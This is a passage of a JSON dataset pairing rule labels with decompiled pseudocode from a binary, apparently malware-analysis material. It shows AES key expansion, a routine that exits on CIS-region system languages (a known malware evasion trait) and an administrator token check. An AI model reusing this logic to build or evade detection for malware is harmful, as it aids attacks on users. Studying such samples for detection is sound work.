SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x80);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[7] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x1b);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[8] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x36);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[9] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    param_1[10] = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^\n                  auVar2 ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aesimc(param_1[9]);\n    param_1[0xb] = auVar2;\n    auVar2 = aesimc(param_1[8]);\n    param_1[0xc] = auVar2;\n    auVar2 = aesimc(param_1[7]);\n    param_1[0xd] = auVar2;\n    auVar2 = aesimc(param_1[6]);\n    param_1[0xe] = auVar2;\n    auVar2 = aesimc(param_1[5]);\n    param_1[0xf] = auVar2;\n    auVar2 = aesimc(param_1[4]);\n    param_1[0x10] = auVar2;\n    auVar2 = aesimc(param_1[3]);\n    param_1[0x11] = auVar2;\n    auVar2 = aesimc(param_1[2]);\n    param_1[0x12] = auVar2;\n    auVar2 = aesimc(param_1[1]);\n    param_1[0x13] = auVar2;\n    return;\n}\n",
        "token_count": 3579
    },
    "00416990": {
        "rules": [
            "terminate process",
            "identify system language via API"
        ],
        "decompiled_code": "\nvoid fcn.00416990(void)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetSystemDefaultUILanguage)();\n    if (((((((iVar1 != 0x82c) && (iVar1 != 0x42c)) && (iVar1 != 0x42b)) && ((iVar1 != 0x423 && (iVar1 != 0x437)))) &&\n         (iVar1 != 0x43f)) &&\n        (((((iVar1 != 0x440 && (iVar1 != 0x819)) &&\n           ((iVar1 != 0x419 && (((iVar1 != 0x428 && (iVar1 != 0x442)) && (iVar1 != 0x843)))))) &&\n          ((iVar1 != 0x443 && (iVar1 != 0x422)))) &&\n         (iVar1 = (*_sym.imp.KERNEL32.dll_GetUserDefaultUILanguage)(),  iVar1 != 0x82c)))) &&\n       ((((iVar1 != 0x42c && (iVar1 != 0x42b)) &&\n         ((iVar1 != 0x423 && (((iVar1 != 0x437 && (iVar1 != 0x43f)) && (iVar1 != 0x440)))))) &&\n        (((iVar1 != 0x819 && (iVar1 != 0x419)) &&\n         ((iVar1 != 0x428 && (((iVar1 != 0x442 && (iVar1 != 0x843)) && ((iVar1 != 0x443 && (iVar1 != 0x422)))))))))))) {\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    return;\n}\n",
        "token_count": 373
    },
    "00412680": {
        "rules": [
            "get token membership"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00412680(uint *param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_FS_OFFSET;\n    uint SidToCheck;\n    int32_t TokenHandle;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t IsMember;\n    \n    var_ch = 0;\n    TokenHandle = 0;\n    uVar4 = 0;\n    IsMember = 0;\n    var_8h = 0;\n    *param_1 = 0;\n    iVar3 = (*_sym.imp.ntdll.dll_NtOpenProcessToken)(0xffffffff, 8, &var_ch);\n    if (iVar3 == 0) {\n        var_8h = 0x44;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x1a, 0, &SidToCheck, &var_8h);\n        if ((iVar3 != 0) &&\n           (iVar3 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, &SidToCheck, &IsMember),  iVar3 != 0)) {\n            if (IsMember == 0) {\n                iVar3 = (*_sym.imp.ntdll.dll_NtQueryInformationToken)(var_ch, 0x13, &TokenHandle, 4, &var_8h);\n                if (iVar3 != 0) {\n                    uVar1 = *(in_FS_OFFSET + 0x34);\n                    if (((uVar1 != 0x520) && (uVar1 != 0x522)) && (uVar4 = uVar1,  0 < uVar1)) {\n                        uVar4 = uVar1 & 0xffff | 0x80070000;\n                    }\n                    goto code_r0x00412773;\n                }\n                iVar3 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(TokenHandle, &SidToCheck, &IsMember);\n                if (iVar3 == 0) goto code_r0x004126bc;\n                if (IsMember == 0) goto code_r0x00412773;\n            }\n            *param_1 = 1;\n            goto code_r0x00412773;\n        }\n    }\ncode_r0x004126bc:\n    uVar4 = *(in_FS_OFFSET + 0x34);\n    if (0 < uVar4) {\n        uVar4 = uVar4 & 0xffff | 0x80070000;\n    }\ncode_r0x00412773:\n    pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (var_ch != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n    }\n    if (TokenHandle != 0) {\n        (*pcVar2)(TokenHandle);\n    }\n    return uVar4;\n}\n",
        "token_count": 643
    }
}